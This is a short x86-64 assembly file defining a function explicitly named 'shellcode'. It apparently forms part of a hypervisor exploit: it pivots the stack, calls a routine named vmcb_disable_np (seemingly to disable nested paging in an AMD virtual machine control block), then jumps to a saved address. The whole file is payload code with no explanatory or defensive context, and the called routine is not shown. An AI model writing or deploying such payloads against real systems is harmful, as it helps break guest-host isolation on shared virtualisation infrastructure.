.intel_syntax noprefix
.text
.global shellcode
.type shellcode, @function
shellcode:
    lea     rsp, [rip + 0xef9]
    push    rbx
    push    rsi
    push    rdi
    sub     rsp, 8
    lea     rbx, [rsp + 0x20]
    mov     rdi, rbx
    call    vmcb_disable_np
    mov     rcx, qword ptr [rbx]
    add     rsp, 8
    pop     rdi
    pop     rsi
    pop     rbx
    jmp     rcx
.size shellcode, .-shellcode
